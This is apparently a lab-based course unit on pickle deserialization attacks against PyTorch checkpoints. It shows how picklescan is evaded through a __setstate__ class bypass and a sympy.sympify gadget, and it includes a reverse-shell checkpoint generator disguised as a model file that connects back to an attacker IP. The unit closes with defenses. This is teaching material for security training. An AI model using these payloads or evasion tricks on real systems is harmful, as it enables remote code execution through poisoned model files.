[573159b0de9875c684db18d9c34d1d24-pickle_scanner_01.mp4](../_resources/573159b0de9875c684db18d9c34d1d24-pickle_scanner_01.mp4)

# 8.3.1. Pickle Scanner & Detection Bypass

> **Lab environment:** Both sections of this Learning Unit reuse the **Supply Chain Attacks** VM group from the previous Learning Units.

## Introduction

In the **Code Execution Attacks** Learning Unit, the *Pickle Deserialization RCE* section exploited:

```python
torch.load(weights_only=False)
```

A malicious model checkpoint used Python's `__reduce__()` method to invoke `os.system()` with a reverse-shell command. This provided a shell as `r.chen` on the `DEVWK01` (`.21`) machine.

The malicious checkpoint had an obvious indicator: it was only 1,519 bytes, whereas legitimate model files were approximately 46 MB. Its pickle bytecode was also trivially detectable because it contained:

- A `GLOBAL` opcode referencing `posix system`.
- A `REDUCE` opcode that invoked it.

Security tools such as `picklescan` disassemble the pickle bytecode embedded in `.pt` files and search for dangerous patterns. In particular, they inspect `GLOBAL` opcodes for references to modules and functions such as `os`, `subprocess`, `builtins`, and `nt`.

If such a scanner is placed in front of an ML checkpoint auto-loader, the earlier payload is detected before the victim process deserializes it.

This section examines pickle scanners at the opcode level and demonstrates why blocklist-based detection can be bypassed.

## Required Package Versions

> **Warning:** Perform the following exercises only in the authorized lab environment. Use the specified package versions so that `picklescan`'s blocklist and behavior match the walkthrough.

```text
picklescan==1.0.4
torch==2.11.0+cpu
sympy==1.14.0
fickling==0.1.10
safetensors==0.7.0
transformers==5.3.0
peft==0.18.1
numpy==2.4.3
```

Install the dependencies inside a virtual environment using `requirements.txt`, or run:

```bash
pip install \
  picklescan==1.0.4 \
  sympy==1.14.0 \
  fickling==0.1.10 \
  safetensors==0.7.0 \
  transformers==5.3.0 \
  peft==0.18.1 \
  numpy==2.4.3 \
  torch==2.11.0+cpu \
  --index-url https://download.pytorch.org/whl/cpu \
  --extra-index-url https://pypi.org/simple/
```

## Understanding Scanner Detection

Before considering bypasses, we need to understand what scanners inspect. Create a minimal payload on the Kali machine and examine its raw pickle opcodes.

Create `baseline_gen.py`:

```python
#!/usr/bin/env python3
import torch
import os

class MaliciousCheckpoint:
    def __reduce__(self):
        return (os.system, ("id",))

torch.save(MaliciousCheckpoint(), "baseline.pt")
print("[+] Created baseline.pt")
```

*Listing 65 — Creating a minimal baseline payload for opcode inspection.*

The `id` command is used instead of a full reverse shell to keep the opcode output readable. The underlying deserialization mechanism is otherwise identical.

Generate the checkpoint:

```bash
kali@kali:~$ python3 baseline_gen.py
[+] Created baseline.pt
```

*Listing 66 — Generating the baseline checkpoint.*

## Disassembling PyTorch Pickle Bytecode

`torch.save()` packages pickle data inside a ZIP archive. Extract and disassemble the embedded `data.pkl` stream:

```bash
kali@kali:~$ python3 -c "
import pickletools, io, zipfile
with zipfile.ZipFile('baseline.pt') as z:
    for name in z.namelist():
        if 'data.pkl' in name:
            data = z.read(name)
            break
pickletools.dis(io.BytesIO(data))
"
```

Output:

```text
    0: \x80 PROTO      2
    2: c    GLOBAL     'posix system'
   16: q    BINPUT     0
   18: X    BINUNICODE 'id'
   27: q    BINPUT     1
   29: \x85 TUPLE1
   30: q    BINPUT     2
   32: R    REDUCE
   33: q    BINPUT     3
   35: .    STOP
```

*Listing 67 — Disassembly reveals the attack pattern.*

Two opcodes are critical:

1. `GLOBAL 'posix system'` loads `os.system`. On Linux, Python maps `os.system` to `posix.system`.
2. `REDUCE` calls the loaded function with the argument `id`.

Scan the checkpoint:

```bash
kali@kali:~$ picklescan -p baseline.pt
baseline.pt:baseline/data.pkl: dangerous import 'posix system' FOUND
----------- SCAN SUMMARY -----------
Scanned files: 1
Infected files: 1
Dangerous globals: 1
```

*Listing 68 — `picklescan` flags the direct `os.system` import.*

The baseline payload would therefore be rejected by a pipeline that scans incoming checkpoints.

## Bypass 1: Class Callable with `__setstate__()`

The scanner checks which callable a `GLOBAL` opcode loads. Obvious alternatives such as `builtins.exec` and `builtins.eval` are already blocklisted.

One alternative is to use a custom class as the callable while placing the actual operation inside `__setstate__()`.

The `__reduce__()` method can return a three-element tuple:

```python
def __reduce__(self):
    return (callable, args, state_dict)
    #       ^          ^     ^
    #       |          |     └─ Passed to __setstate__() through BUILD
    #       |          └─────── Passed to callable through REDUCE
    #       └────────────────── Scanner inspects this callable
```

*Listing 69 — Structure of the three-element `__reduce__()` tuple.*

If the callable is the class itself, pickle represents it as a user-defined global such as:

```text
GLOBAL '__main__ SetStateBypass'
```

This is not a directly dangerous standard-library function. During deserialization, the `BUILD` opcode restores the object's state and invokes `__setstate__()`.

Create `bypass_setstate_gen.py`:

```python
#!/usr/bin/env python3
import torch

class SetStateBypass:
    def __reduce__(self):
        return (
            SetStateBypass,  # Class itself; no dangerous import
            (),              # Calls SetStateBypass() with no arguments
            {"cmd": "id"},   # State passed to __setstate__ through BUILD
        )

    def __setstate__(self, state):
        import os
        os.system(state["cmd"])

torch.save(SetStateBypass(), "bypass_setstate.pt")
print("[+] Created bypass_setstate.pt")
```

*Listing 70 — Class-as-callable bypass using `__setstate__()`.*

Generate and scan the checkpoint:

```bash
kali@kali:~$ python3 bypass_setstate_gen.py
[+] Created bypass_setstate.pt

kali@kali:~$ picklescan -p bypass_setstate.pt
----------- SCAN SUMMARY -----------
Scanned files: 1
Infected files: 0
```

*Listing 71 — `picklescan` reports no issues.*

The only `GLOBAL` opcode references `__main__.SetStateBypass`, which is not blocklisted. The scanner does not inspect the class's Python source code, and it cannot generally treat every `BUILD` opcode as malicious because `BUILD` is commonly used to restore ordinary object state.

### Limitation

The `SetStateBypass` class must be importable on the target machine. If the checkpoint is loaded where that class does not exist, deserialization raises `ModuleNotFoundError`.

This approach therefore works only when:

- The attacker can place the class on the target, such as through dependency confusion; or
- Checkpoint creation and loading occur in an environment where the class is already defined.

For a portable checkpoint, a callable already installed on the target is required.

## Gadget Functions

A **gadget function** is a legitimate callable that can be repurposed because it passes attacker-controlled data into a dangerous operation such as `exec()` or `eval()`.

A useful gadget must meet three conditions:

1. It exists in a library commonly installed in ML environments.
2. It is absent from the scanner's blocklist.
3. It forwards attacker-controlled input into `eval()`, `exec()`, or an equivalent operation without sufficient validation.

Many obvious candidates are validated or blocklisted. For example, `timeit.timeit()` was patched in `picklescan` version `0.0.25`.

## Bypass 2: `sympy.sympify()` Gadget

SymPy is a symbolic mathematics package installed as a PyTorch dependency and is therefore common on ML workstations.

Its `sympify()` function converts string expressions into SymPy objects. In the tested versions, the processing path can evaluate Python expressions, including an expression containing `__import__()`. At the time of the walkthrough, `sympy.sympify()` was not blocked by `picklescan 1.0.4`.

Create `bypass_sympify_gen.py`:

```python
#!/usr/bin/env python3
import torch
import sympy

class SympifyRCE:
    def __reduce__(self):
        cmd = "__import__('os').system('id')"
        return (sympy.sympify, (cmd,))

torch.save(SympifyRCE(), "bypass_sympify.pt")
print("[+] Created bypass_sympify.pt")
```

*Listing 72 — Using `sympy.sympify` as an evaluation gadget.*

Generate and scan the file:

```bash
kali@kali:~$ python3 bypass_sympify_gen.py
[+] Created bypass_sympify.pt

kali@kali:~$ picklescan -p bypass_sympify.pt
----------- SCAN SUMMARY -----------
Scanned files: 1
Infected files: 0
```

*Listing 73 — `picklescan` reports no issues for the SymPy gadget.*

The scanner sees a legitimate, non-blocklisted SymPy callable. The dangerous evaluation occurs inside the library implementation rather than appearing directly as a dangerous pickle global.

### Inspecting the Gadget Opcodes

```bash
kali@kali:~$ python3 -c "
import pickletools, io, zipfile
with zipfile.ZipFile('bypass_sympify.pt') as z:
    for name in z.namelist():
        if 'data.pkl' in name:
            data = z.read(name)
            break
pickletools.dis(io.BytesIO(data))
"
```

Output:

```text
    0: \x80 PROTO      2
    2: c    GLOBAL     'sympy.core.sympify sympify'
   30: q    BINPUT     0
   32: X    BINUNICODE "__import__('os').system('id')"
   66: q    BINPUT     1
   68: \x85 TUPLE1
   69: R    REDUCE
   ...
```

*Listing 74 — The pickle loads `sympify` and invokes it with the supplied expression.*

## Reverse-Shell Payload Generator

The gadget can also be used in the authorized lab to generate the reverse-shell checkpoint demonstrated in the course.

Create `bypass_sympify_revshell.py`:

```python
#!/usr/bin/env python3
import torch
import sympy
import sys

LHOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.251.52"
LPORT = sys.argv[2] if len(sys.argv) > 2 else "80"
OUT   = sys.argv[3] if len(sys.argv) > 3 else "resnet18_epoch_099.pt"

class SympifyRevShell:
    def __reduce__(self):
        return (sympy.sympify, (
            f"__import__('os').system("
            f"'python3 -c \\'import socket,subprocess,os;"
            f"s=socket.socket();"
            f"s.connect((\"{LHOST}\",{LPORT}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/bash\",\"-i\"])\\''"
            f")",
        ))

torch.save(SympifyRevShell(), OUT)
print(f"[+] {OUT} -> {LHOST}:{LPORT}")
```

*Listing 75 — Payload generator using the `sympify` gadget.*

Generate and scan the checkpoint:

```bash
kali@kali:~$ python3 bypass_sympify_revshell.py
[+] resnet18_epoch_099.pt -> 192.168.251.52:80

kali@kali:~$ picklescan -p resnet18_epoch_099.pt
----------- SCAN SUMMARY -----------
Scanned files: 1
Infected files: 0
```

*Listing 76 — The lab payload passes the tested scanner version.*

> **Validation:** To validate the checkpoint in the authorized lab, repeat the workflow from the *Pickle Deserialization RCE* section: upload it through `scp` to `/srv/models/` on `DEVWK01`, start the designated listener on the attacker machine, and wait for `r.chen`'s auto-loader to process the checkpoint with the highest epoch number.

## Payload Comparison

| Payload | Technique | Scanner result | Cross-machine? |
|---|---|---|---|
| `baseline.pt` | Direct `os.system` | Detected | Yes |
| `bypass_setstate.pt` | Custom class with `__setstate__()` | Bypasses | No; class required on target |
| `bypass_sympify.pt` | `sympy.sympify()` gadget | Bypasses | Yes, when compatible SymPy is installed |

*Table 1 — Payload variants.*

## Fundamental Limitation of Blocklists

The 2025 **PickleCloak** research identified 133 exploitable gadget functions across the Python standard library, NumPy, SymPy, and Pandas. These functions wrap operations such as `exec()` or `eval()` but may not appear on scanner blocklists.

This creates an asymmetry:

- An attacker needs to find only one unblocked callable.
- A defender must identify every dangerous callable and every path through which it can be reached.

Patching individual gadgets improves detection but does not eliminate unsafe deserialization.

## Reliable Defenses

The strongest defense operates at the deserialization layer rather than relying solely on scanning.

### Use `weights_only=True`

PyTorch uses `weights_only=True` by default beginning with version 2.6. This mode restricts `torch.load()` to the limited types required for tensor state dictionaries instead of permitting arbitrary Python object construction.

```python
state = torch.load(path, weights_only=True)
```

Applications should load state dictionaries rather than serialized model objects whenever possible.

### Prefer SafeTensors

SafeTensors stores tensor data and metadata without Python pickle semantics. It does not support arbitrary Python object deserialization and therefore removes this pickle execution path by design.

### Treat scanning as defense in depth

Pickle scanners remain useful for:

- Detecting common malicious patterns.
- Providing visibility into model artifacts.
- Rejecting known dangerous globals.
- Supporting incident response and pipeline auditing.

They should not be the only security boundary protecting an unsafe `torch.load(weights_only=False)` operation.

## Key Takeaways

1. Direct `os.system` payloads are easily identified through pickle opcode inspection.
2. Blocklist scanners judge visible pickle globals but may miss dangerous behavior hidden inside custom classes or library gadget functions.
3. A class-based `__setstate__()` technique is not portable unless the class exists on the target.
4. Common ML dependencies can expose portable gadget functions.
5. Scanner blocklists cannot reliably make unrestricted pickle deserialization safe.
6. Use `torch.load(weights_only=True)` or a non-executable format such as SafeTensors.